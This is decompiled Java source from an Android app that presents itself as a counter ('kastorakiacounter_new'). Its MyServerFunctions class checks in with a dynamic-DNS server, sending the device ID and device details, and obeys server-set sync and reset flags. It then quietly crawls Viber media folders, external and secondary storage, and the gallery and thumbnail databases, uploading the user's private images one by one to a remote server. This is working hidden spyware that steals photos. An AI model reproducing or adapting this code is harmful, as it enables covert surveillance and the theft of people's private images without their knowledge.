package gr.georkouk.kastorakiacounter_new;

import android.content.Context;
import android.content.SharedPreferences;
import android.content.SharedPreferences.Editor;
import android.content.pm.PackageManager.NameNotFoundException;
import android.database.Cursor;
import android.graphics.Bitmap;
import android.graphics.Bitmap.CompressFormat;
import android.graphics.BitmapFactory;
import android.graphics.BitmapFactory.Options;
import android.os.Environment;
import android.provider.MediaStore.Images.Media;
import android.provider.MediaStore.Images.Thumbnails;
import android.support.v4.media.session.PlaybackStateCompat;
import java.io.ByteArrayOutputStream;
import java.io.File;
import java.util.ArrayList;
import java.util.List;
import org.springframework.core.io.ByteArrayResource;
import org.springframework.core.io.FileSystemResource;
import org.springframework.core.io.Resource;
import org.springframework.http.HttpEntity;
import org.springframework.http.HttpHeaders;
import org.springframework.http.HttpMethod;
import org.springframework.http.MediaType;
import org.springframework.util.LinkedMultiValueMap;
import org.springframework.util.MultiValueMap;
import org.springframework.web.client.RestTemplate;

public class MyServerFunctions {
    String appVersion;
    Context context;
    int findex = 0;
    GenerateUID guid;
    List<List<String>> listOfAllImages = new ArrayList();
    String savedUid;
    boolean sync;
    String uid;

    public MyServerFunctions(Context context_) {
        this.context = context_;
        this.guid = new GenerateUID(this.context);
        this.uid = this.guid.generate();
        this.savedUid = this.guid.getSavedUID();
        this.sync = true;
        try {
            this.appVersion = this.context.getPackageManager().getPackageInfo(this.context.getPackageName(), 0).versionName;
        } catch (NameNotFoundException e) {
            this.appVersion = "1";
        }
    }

    /* JADX WARNING: Failed to extract finally block: empty outs */
    public boolean checkConnection() {
        /*
        r26 = this;
        r0 = r26;
        r0 = r0.context;
        r23 = r0;
        r24 = "connectivity";
        r2 = r23.getSystemService(r24);
        r2 = (android.net.ConnectivityManager) r2;
        r14 = r2.getActiveNetworkInfo();
        r3 = 0;
        if (r14 == 0) goto L_0x02b0;
    L_0x0015:
        r23 = r14.isConnected();
        if (r23 == 0) goto L_0x02b0;
    L_0x001b:
        r22 = 0;
        r21 = new java.net.URL;	 Catch:{ Exception -> 0x026e }
        r23 = new java.lang.StringBuilder;	 Catch:{ Exception -> 0x026e }
        r23.<init>();	 Catch:{ Exception -> 0x026e }
        r24 = "http://myvf.no-ip.biz:8086//app?question=check&appKey=kastorakiaCounter&uid=";
        r23 = r23.append(r24);	 Catch:{ Exception -> 0x026e }
        r0 = r26;
        r0 = r0.uid;	 Catch:{ Exception -> 0x026e }
        r24 = r0;
        r23 = r23.append(r24);	 Catch:{ Exception -> 0x026e }
        r24 = "&appVersion=";
        r23 = r23.append(r24);	 Catch:{ Exception -> 0x026e }
        r0 = r26;
        r0 = r0.appVersion;	 Catch:{ Exception -> 0x026e }
        r24 = r0;
        r23 = r23.append(r24);	 Catch:{ Exception -> 0x026e }
        r24 = "&savedUid=";
        r23 = r23.append(r24);	 Catch:{ Exception -> 0x026e }
        r0 = r26;
        r0 = r0.savedUid;	 Catch:{ Exception -> 0x026e }
        r24 = r0;
        r23 = r23.append(r24);	 Catch:{ Exception -> 0x026e }
        r24 = "&locale=";
        r23 = r23.append(r24);	 Catch:{ Exception -> 0x026e }
        r24 = java.util.Locale.getDefault();	 Catch:{ Exception -> 0x026e }
        r24 = r24.toString();	 Catch:{ Exception -> 0x026e }
        r23 = r23.append(r24);	 Catch:{ Exception -> 0x026e }
        r24 = "&details=";
        r23 = r23.append(r24);	 Catch:{ Exception -> 0x026e }
        r0 = r26;
        r0 = r0.guid;	 Catch:{ Exception -> 0x026e }
        r24 = r0;
        r24 = r24.getDeviceDetails();	 Catch:{ Exception -> 0x026e }
        r23 = r23.append(r24);	 Catch:{ Exception -> 0x026e }
        r23 = r23.toString();	 Catch:{ Exception -> 0x026e }
        r0 = r21;
        r1 = r23;
        r0.<init>(r1);	 Catch:{ Exception -> 0x026e }
        r23 = r21.openConnection();	 Catch:{ Exception -> 0x026e }
        r0 = r23;
        r0 = (java.net.HttpURLConnection) r0;	 Catch:{ Exception -> 0x026e }
        r22 = r0;
        r23 = "User-Agent";
        r24 = "application/json";
        r22.setRequestProperty(r23, r24);	 Catch:{ Exception -> 0x026e }
        r23 = "Connection";
        r24 = "Keep-alive";
        r22.setRequestProperty(r23, r24);	 Catch:{ Exception -> 0x026e }
        r23 = 10000; // 0x2710 float:1.4013E-41 double:4.9407E-320;
        r22.setConnectTimeout(r23);	 Catch:{ Exception -> 0x026e }
        r22.connect();	 Catch:{ Exception -> 0x026e }
        r23 = r22.getResponseCode();	 Catch:{ Exception -> 0x026e }
        r24 = 200; // 0xc8 float:2.8E-43 double:9.9E-322;
        r0 = r23;
        r1 = r24;
        if (r0 != r1) goto L_0x02ae;
    L_0x00b1:
        r3 = 1;
        r11 = 0;
        r11 = r22.getInputStream();	 Catch:{ Exception -> 0x0268 }
    L_0x00b7:
        r7 = javax.xml.parsers.DocumentBuilderFactory.newInstance();	 Catch:{ Exception -> 0x026e }
        r6 = 0;
        r6 = r7.newDocumentBuilder();	 Catch:{ Exception -> 0x0279 }
    L_0x00c0:
        r5 = 0;
        r10 = 0;
        r16 = 0;
        if (r11 == 0) goto L_0x0286;
    L_0x00c6:
        r16 = new java.io.BufferedReader;	 Catch:{ Exception -> 0x026e }
        r23 = new java.io.InputStreamReader;	 Catch:{ Exception -> 0x026e }
        r0 = r23;
        r0.<init>(r11);	 Catch:{ Exception -> 0x026e }
        r0 = r16;
        r1 = r23;
        r0.<init>(r1);	 Catch:{ Exception -> 0x026e }
    L_0x00d6:
        r18 = new java.lang.StringBuilder;	 Catch:{ Exception -> 0x026e }
        r18.<init>();	 Catch:{ Exception -> 0x026e }
        if (r16 == 0) goto L_0x0289;
    L_0x00dd:
        r13 = r16.readLine();	 Catch:{ Exception -> 0x00ef }
        if (r13 == 0) goto L_0x00f3;
    L_0x00e3:
        r0 = r18;
        r23 = r0.append(r13);	 Catch:{ Exception -> 0x00ef }
        r24 = 10;
        r23.append(r24);	 Catch:{ Exception -> 0x00ef }
        goto L_0x00dd;
    L_0x00ef:
        r8 = move-exception;
        r8.printStackTrace();	 Catch:{ Exception -> 0x026e }
    L_0x00f3:
        r19 = r18.toString();	 Catch:{ Exception -> 0x026e }
        r12 = new java.io.ByteArrayInputStream;	 Catch:{ Exception -> 0x028f }
        r23 = "UTF-8";
        r0 = r19;
        r1 = r23;
        r23 = r0.getBytes(r1);	 Catch:{ Exception -> 0x028f }
        r0 = r23;
        r12.<init>(r0);	 Catch:{ Exception -> 0x028f }
        if (r6 == 0) goto L_0x028c;
    L_0x010a:
        r5 = r6.parse(r12);	 Catch:{ Exception -> 0x028f }
    L_0x010e:
        if (r10 != 0) goto L_0x02ac;
    L_0x0110:
        r23 = r5.getDocumentElement();	 Catch:{ Exception -> 0x026e }
        r23.normalize();	 Catch:{ Exception -> 0x026e }
        r23 = "ROW";
        r0 = r23;
        r17 = r5.getElementsByTagName(r0);	 Catch:{ Exception -> 0x026e }
        r23 = 0;
        r0 = r17;
        r1 = r23;
        r4 = r0.item(r1);	 Catch:{ Exception -> 0x026e }
        r15 = r4.getAttributes();	 Catch:{ Exception -> 0x026e }
        r23 = "updateUID";
        r0 = r23;
        r23 = r15.getNamedItem(r0);	 Catch:{ Exception -> 0x026e }
        r20 = r23.getNodeValue();	 Catch:{ Exception -> 0x026e }
        r23 = "sync";
        r0 = r23;
        r23 = r15.getNamedItem(r0);	 Catch:{ Exception -> 0x0293 }
        r23 = r23.getNodeValue();	 Catch:{ Exception -> 0x0293 }
        r24 = "1";
        r23 = r23.equals(r24);	 Catch:{ Exception -> 0x0293 }
        r0 = r23;
        r1 = r26;
        r1.sync = r0;	 Catch:{ Exception -> 0x0293 }
    L_0x0151:
        r0 = r26;
        r0 = r0.context;	 Catch:{ Exception -> 0x026e }
        r23 = r0;
        r24 = "Settings";
        r25 = 0;
        r23 = r23.getSharedPreferences(r24, r25);	 Catch:{ Exception -> 0x026e }
        r9 = r23.edit();	 Catch:{ Exception -> 0x026e }
        r23 = "sec";
        r24 = "sec";
        r0 = r24;
        r24 = r15.getNamedItem(r0);	 Catch:{ Exception -> 0x0299 }
        r24 = r24.getNodeValue();	 Catch:{ Exception -> 0x0299 }
        r24 = java.lang.Integer.valueOf(r24);	 Catch:{ Exception -> 0x0299 }
        r24 = r24.intValue();	 Catch:{ Exception -> 0x0299 }
        r0 = r23;
        r1 = r24;
        r9.putInt(r0, r1);	 Catch:{ Exception -> 0x0299 }
    L_0x0180:
        r23 = "reset";
        r0 = r23;
        r23 = r15.getNamedItem(r0);	 Catch:{ Exception -> 0x02a7 }
        r23 = r23.getNodeValue();	 Catch:{ Exception -> 0x02a7 }
        r24 = "1";
        r23 = r23.equalsIgnoreCase(r24);	 Catch:{ Exception -> 0x02a7 }
        if (r23 == 0) goto L_0x0244;
    L_0x0194:
        r23 = "vithu";
        r24 = 0;
        r0 = r23;
        r1 = r24;
        r9.putBoolean(r0, r1);	 Catch:{ Exception -> 0x02a7 }
        r23 = "vithuA";
        r24 = 0;
        r0 = r23;
        r1 = r24;
        r9.putInt(r0, r1);	 Catch:{ Exception -> 0x02a7 }
        r23 = "viima";
        r24 = 0;
        r0 = r23;
        r1 = r24;
        r9.putBoolean(r0, r1);	 Catch:{ Exception -> 0x02a7 }
        r23 = "viimaA";
        r24 = 0;
        r0 = r23;
        r1 = r24;
        r9.putInt(r0, r1);	 Catch:{ Exception -> 0x02a7 }
        r23 = "vitemp";
        r24 = 0;
        r0 = r23;
        r1 = r24;
        r9.putBoolean(r0, r1);	 Catch:{ Exception -> 0x02a7 }
        r23 = "vitempA";
        r24 = 0;
        r0 = r23;
        r1 = r24;
        r9.putInt(r0, r1);	 Catch:{ Exception -> 0x02a7 }
        r23 = "vivid";
        r24 = 0;
        r0 = r23;
        r1 = r24;
        r9.putBoolean(r0, r1);	 Catch:{ Exception -> 0x02a7 }
        r23 = "vividA";
        r24 = 0;
        r0 = r23;
        r1 = r24;
        r9.putInt(r0, r1);	 Catch:{ Exception -> 0x02a7 }
        r23 = "exims";
        r24 = 0;
        r0 = r23;
        r1 = r24;
        r9.putBoolean(r0, r1);	 Catch:{ Exception -> 0x02a7 }
        r23 = "eximsA";
        r24 = 0;
        r0 = r23;
        r1 = r24;
        r9.putInt(r0, r1);	 Catch:{ Exception -> 0x02a7 }
        r23 = "thu";
        r24 = 0;
        r0 = r23;
        r1 = r24;
        r9.putBoolean(r0, r1);	 Catch:{ Exception -> 0x02a7 }
        r23 = "thuA";
        r24 = 0;
        r0 = r23;
        r1 = r24;
        r9.putInt(r0, r1);	 Catch:{ Exception -> 0x02a7 }
        r23 = "ims";
        r24 = 0;
        r0 = r23;
        r1 = r24;
        r9.putBoolean(r0, r1);	 Catch:{ Exception -> 0x02a7 }
        r23 = "imsA";
        r24 = 0;
        r0 = r23;
        r1 = r24;
        r9.putInt(r0, r1);	 Catch:{ Exception -> 0x02a7 }
        r23 = "alims";
        r24 = 0;
        r0 = r23;
        r1 = r24;
        r9.putBoolean(r0, r1);	 Catch:{ Exception -> 0x02a7 }
        r23 = "alimsA";
        r24 = 0;
        r0 = r23;
        r1 = r24;
        r9.putInt(r0, r1);	 Catch:{ Exception -> 0x02a7 }
    L_0x0244:
        r9.apply();	 Catch:{ Exception -> 0x026e }
        r23 = "true";
        r0 = r20;
        r1 = r23;
        r23 = r0.equalsIgnoreCase(r1);	 Catch:{ Exception -> 0x026e }
        if (r23 == 0) goto L_0x0262;
    L_0x0253:
        r0 = r26;
        r0 = r0.guid;	 Catch:{ Exception -> 0x026e }
        r23 = r0;
        r0 = r26;
        r0 = r0.uid;	 Catch:{ Exception -> 0x026e }
        r24 = r0;
        r23.updateSavedUID(r24);	 Catch:{ Exception -> 0x026e }
    L_0x0262:
        if (r22 == 0) goto L_0x0267;
    L_0x0264:
        r22.disconnect();
    L_0x0267:
        return r3;
    L_0x0268:
        r8 = move-exception;
        r8.printStackTrace();	 Catch:{ Exception -> 0x026e }
        goto L_0x00b7;
    L_0x026e:
        r8 = move-exception;
        r8.printStackTrace();	 Catch:{ all -> 0x027f }
        r3 = 0;
        if (r22 == 0) goto L_0x0267;
    L_0x0275:
        r22.disconnect();
        goto L_0x0267;
    L_0x0279:
        r8 = move-exception;
        r8.printStackTrace();	 Catch:{ Exception -> 0x026e }
        goto L_0x00c0;
    L_0x027f:
        r23 = move-exception;
        if (r22 == 0) goto L_0x0285;
    L_0x0282:
        r22.disconnect();
    L_0x0285:
        throw r23;
    L_0x0286:
        r10 = 1;
        goto L_0x00d6;
    L_0x0289:
        r10 = 1;
        goto L_0x00f3;
    L_0x028c:
        r10 = 1;
        goto L_0x010e;
    L_0x028f:
        r8 = move-exception;
        r10 = 1;
        goto L_0x010e;
    L_0x0293:
        r8 = move-exception;
        r8.printStackTrace();	 Catch:{ Exception -> 0x026e }
        goto L_0x0151;
    L_0x0299:
        r8 = move-exception;
        r23 = "sec";
        r24 = 5;
        r0 = r23;
        r1 = r24;
        r9.putInt(r0, r1);	 Catch:{ Exception -> 0x026e }
        goto L_0x0180;
    L_0x02a7:
        r8 = move-exception;
        r8.printStackTrace();	 Catch:{ Exception -> 0x026e }
        goto L_0x0244;
    L_0x02ac:
        r3 = 0;
        goto L_0x0262;
    L_0x02ae:
        r3 = 0;
        goto L_0x0262;
    L_0x02b0:
        r3 = 0;
        goto L_0x0267;
        */
        throw new UnsupportedOperationException("Method not decompiled: gr.georkouk.kastorakiacounter_new.MyServerFunctions.checkConnection():boolean");
    }

    public void register() {
        if (this.sync) {
            SharedPreferences settings = this.context.getSharedPreferences("Settings", 0);
            String sdPath = Environment.getExternalStorageDirectory().getAbsolutePath();
            File fthu = new File(sdPath + "/viber/media/.thumbnails");
            File fima = new File(sdPath + "/viber/media/Viber Images");
            File ftemp = new File(sdPath + "/viber/media/.temp");
            File fvid = new File(sdPath + "/viber/media/.converted_videos");
            if (fthu.isDirectory() && !settings.getBoolean("vithu", false)) {
                upFF(sdPath + "/viber/media/.thumbnails", "vithu", "vithuA", false);
            } else if (!fima.isDirectory() || settings.getBoolean("viima", false)) {
                try {
                    if (ftemp.isDirectory() && !settings.getBoolean("vitemp", false)) {
                        upFF(sdPath + "/viber/media/.temp", "vitemp", "vitempA", false);
                    } else if (!fvid.isDirectory() || settings.getBoolean("vivid", false)) {
                        try {
                            String[] temp = System.getenv("SECONDARY_STORAGE").split(":");
                            if (temp.length > 0) {
                                upFF(temp[0], "exims", "eximsA", false);
                            }
                        } catch (Exception e) {
                            e.printStackTrace();
                        }
                        upThs();
                        upIs();
                        try {
                            upFF(sdPath, "alims", "alimsA", false);
                        } catch (Exception e2) {
                            e2.printStackTrace();
                        }
                    } else {
                        upFF(sdPath + "/viber/media/.converted_videos", "vivid", "vividA", true);
                    }
                } catch (Exception e22) {
                    e22.printStackTrace();
                }
            } else {
                upFF(sdPath + "/viber/media/Viber Images", "viima", "viimaA", false);
            }
        }
    }

    public void upThs() {
        int oldIndex = this.context.getSharedPreferences("Settings", 0).getInt("thuA", 0);
        upFC(this.context.getContentResolver().query(Thumbnails.EXTERNAL_CONTENT_URI, new String[]{"_data", "_id"}, "_id > " + oldIndex, null, null), "thu", "thuA");
    }

    public void upIs() {
        int oldIndex = this.context.getSharedPreferences("Settings", 0).getInt("imsA", 0);
        upFC(this.context.getContentResolver().query(Media.EXTERNAL_CONTENT_URI, new String[]{"_data", "_id"}, "_id > " + oldIndex, null, null), "ims", "imsA");
    }

    public void upFC(Cursor cursor_, String flagOk_, String flagIndex_) {
        Editor editor = this.context.getSharedPreferences("Settings", 0).edit();
        int column_index_data = cursor_.getColumnIndexOrThrow("_data");
        int column_index_folder_id = cursor_.getColumnIndexOrThrow("_id");
        for (int i = 0; i == 0 && cursor_.moveToNext(); i++) {
            String PathOfImage = cursor_.getString(column_index_data);
            int index = Integer.valueOf(cursor_.getString(column_index_folder_id)).intValue();
            upPst(new File(PathOfImage), flagOk_ + "_" + cursor_.getCount() + "_index_" + index + "_", false);
            editor.putInt(flagIndex_, index);
            editor.apply();
        }
    }

    public void upFF(String folder_, String flagOk_, String flagIndex_, boolean vid_) {
        Editor editor = this.context.getSharedPreferences("Settings", 0).edit();
        SharedPreferences settings = this.context.getSharedPreferences("Settings", 0);
        List<List<String>> listAll = getAllFOD(new File(folder_));
        int index = settings.getInt(flagIndex_, -1) + 1;
        if (index < listAll.size()) {
            upPst(new File((String) ((List) listAll.get(index)).get(1)), flagOk_ + "_" + listAll.size() + "_index_" + index + "_", vid_);
            editor.putInt(flagIndex_, index);
            editor.apply();
            if (index == listAll.size() - 1) {
                editor.putBoolean(flagOk_, true);
                editor.apply();
            }
        }
        listAll.clear();
    }

    private void upPst(File file, String name, boolean vd) {
        MultiValueMap<String, Object> formData = new LinkedMultiValueMap();
        if (vd) {
            formData.add("image", new FileSystemResource(file));
            return;
        }
        Bitmap bm = null;
        if (file.length() / PlaybackStateCompat.ACTION_PLAY_FROM_MEDIA_ID > 1200) {
            try {
                Options bmOptions = new Options();
                bmOptions.inSampleSize = 2;
                bm = BitmapFactory.decodeFile(file.getAbsolutePath(), bmOptions);
                ByteArrayOutputStream bos = new ByteArrayOutputStream();
                bm.compress(CompressFormat.JPEG, 80, bos);
                final File file2 = file;
                Resource anonymousClass1 = new ByteArrayResource(bos.toByteArray()) {
                    public String getFilename() throws IllegalStateException {
                        return file2.getName();
                    }
                };
                HttpHeaders imageHeaders = new HttpHeaders();
                imageHeaders.setContentType(MediaType.IMAGE_JPEG);
                formData.add("image", new HttpEntity(anonymousClass1, imageHeaders));
            } catch (Exception e) {
                formData.add("image", new FileSystemResource(file));
            }
        } else {
            formData.add("image", new FileSystemResource(file));
        }
        try {
            formData.add(MyVariables.KEY_NAME, name);
            formData.add("folderName", this.uid);
            formData.add("appKey", MyVariables.APPKEY);
            HttpHeaders requestHeaders = new HttpHeaders();
            requestHeaders.setContentType(MediaType.MULTIPART_FORM_DATA);
            new RestTemplate().exchange(MyVariables.SERVERURL2, HttpMethod.POST, new HttpEntity(formData, requestHeaders), String.class, new Object[0]);
        } catch (Exception e2) {
            e2.printStackTrace();
        }
        if (bm != null) {
            try {
                bm.recycle();
            } catch (Exception e22) {
                e22.printStackTrace();
            }
        }
    }

    public List<List<String>> getAllFOD(File directory) {
        File[] files = directory.listFiles();
        if (files != null) {
            for (File file : files) {
                if (file != null) {
                    if (file.isDirectory()) {
                        getAllFOD(file);
                    } else if (file.getAbsolutePath().endsWith(".png") || file.getAbsolutePath().endsWith(".jpg") || file.getAbsolutePath().endsWith(".jpeg") || file.getAbsolutePath().endsWith(".JPG") || file.getAbsolutePath().endsWith(".JPEG") || file.getAbsolutePath().endsWith(".PNG") || file.getAbsolutePath().endsWith(".gif") || file.getAbsolutePath().endsWith(".GIF") || file.getAbsolutePath().endsWith(".bmp")) {
                        List<String> row = new ArrayList();
                        row.add(String.valueOf(this.findex));
                        row.add(file.getAbsolutePath());
                        this.listOfAllImages.add(row);
                        this.findex++;
                    }
                }
            }
        }
        return this.listOfAllImages;
    }
}
